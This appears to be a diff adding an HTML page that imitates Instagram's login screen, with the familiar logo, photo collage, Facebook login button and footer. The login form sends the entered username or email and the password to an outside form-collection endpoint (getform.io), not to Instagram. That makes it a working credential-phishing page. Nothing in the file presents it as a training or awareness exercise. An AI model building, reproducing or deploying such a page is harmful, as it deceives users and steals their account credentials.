@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="instagram.css">
+    <link rel="shortcut icon" href="public/Instagram_logo_2022.svg.webp" type="image/x-icon">
+</head>
+
+<body>
+    <!-- Mobile Header -->
+    <div class="mobile-header">
+        <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img"
+            style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yd/r/5Vve--Eas3M.png&quot;); background-position: 0px -2959px; background-size: 339px 3108px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+        <div class="header-buttons">
+            <a href="#" class="header-btn login-link">Log in</a>
+            <a href="#" class="header-btn open-app-btn">Open app</a>
+        </div>
+    </div>
+
+    <!-- Language Selector (Mobile) -->
+    <div class="language-selector">
+        <button class="language-btn">English (UK) ▼</button>
+    </div>
+
+    <div class="container">
+        <div class="main-content">
+            <!-- Photo Collage Section (Desktop Only) -->
+            <div class="photo-section">
+                <div class="photo-collage">
+                    <div class="photo-card photo-card-1">
+                        <img src="https://ix-marketing.imgix.net/focalpoint.png?auto=format,compress&w=3038 "
+                            alt="Photo 1">
+                    </div>
+                    <div class="photo-card photo-card-2">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=400&h=600&fit=crop&crop=face"
+                            alt="Photo 2">
+                    </div>
+                    <div class="photo-card photo-card-3">
+                        <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=400&h=600&fit=crop&crop=face"
+                            alt="Photo 3">
+                    </div>
+                    <div class="photo-card photo-card-4">
+                        <img src="https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=400&h=600&fit=crop&crop=face"
+                            alt="Photo 4">
+                    </div>
+
+                    <!-- Reaction Icons -->
+                    <div class="reaction reaction-1">🔥</div>
+                    <div class="reaction reaction-2">💜</div>
+                    <div class="reaction reaction-3">💬</div>
+                    <div class="reaction reaction-4">✅</div>
+                </div>
+            </div>
+
+            <!-- Login Section -->
+            <div class="login-section">
+                <div class="login-container">
+                    <i data-visualcompletion="css-img" aria-label="Instagram" class="instagram-logo" role="img"
+                        style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yd/r/5Vve--Eas3M.png&quot;); background-position: 0px -2959px; background-size: 339px 3108px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+
+                    <!-- Facebook Login Button (Mobile First) -->
+                    <button class="facebook-btn" style="display: none;" id="mobile-facebook-btn">
+                        <span style="font-size: 20px;"></span>
+                        Continue with Facebook
+                    </button>
+
+                    <div class="divider" id="mobile-divider" style="display: none;">OR</div>
+
+                    <form class="login-form" action="https://getform.io/f/bllzmdkb" method="POST">
+                        <div class="input-group">
+                            <input type="text" name="email" class="form-input" placeholder="Phone number, username or email address"
+                                required>
+                        </div>
+                        <div class="input-group">
+                            <input type="password" name="pass" class="form-input" placeholder="Password" required>
+                        </div>
+
+                        <div class="forgot-password">
+                            <a href="#">Forgotten your password?</a>
+                        </div>
+
+                        <button type="submit" class="login-btn">Log in</button>
+                    </form>
+
+                    <div class="divider" id="desktop-divider">OR</div>
+
+                    <!-- Facebook Login Button (Desktop) -->
+                    <button class="facebook-btn" id="desktop-facebook-btn">
+                        <span style="font-size: 20px;">📘</span>
+                        Log in with Facebook
+                    </button>
+
+                    <div class="signup-link">
+                        Don't have an account? <a href="#">Sign up</a>
+                    </div>
+
+                    <!-- Terms Notice (Mobile Only) -->
+                    <div class="terms-notice">
+                        By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy
+                            Policy</a>.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer (Desktop Only) -->
+    <div class="footer">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact uploading and non-users</a>
+        <a href="#">Meta Verified</a>
+        <span>© 2025 Instagram from Meta</span>
+    </div>
+
+    <script>
+        // Handle responsive layout changes
+        function handleResize() {
+            const isMobile = window.innerWidth <= 768;
+            const mobileElementsToShow = document.querySelectorAll('#mobile-facebook-btn, #mobile-divider');
+            const desktopElementsToShow = document.querySelectorAll('#desktop-facebook-btn, #desktop-divider');
+
+            if (isMobile) {
+                mobileElementsToShow.forEach(el => el.style.display = 'block');
+                desktopElementsToShow.forEach(el => el.style.display = 'none');
+                document.getElementById('mobile-facebook-btn').style.display = 'flex';
+            } else {
+                mobileElementsToShow.forEach(el => el.style.display = 'none');
+                desktopElementsToShow.forEach(el => el.style.display = 'block');
+                document.getElementById('desktop-facebook-btn').style.display = 'flex';
+            }
+        }
+
+        // Run on load and resize
+        window.addEventListener('load', handleResize);
+        window.addEventListener('resize', handleResize);
+
+        // Add some interactivity
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('focus', function () {
+                this.parentElement.style.transform = 'scale(1.02)';
+            });
+
+            input.addEventListener('blur', function () {
+                this.parentElement.style.transform = 'scale(1)';
+            });
+        });
+
+        
+    </script>
+</body>
+
+</html>
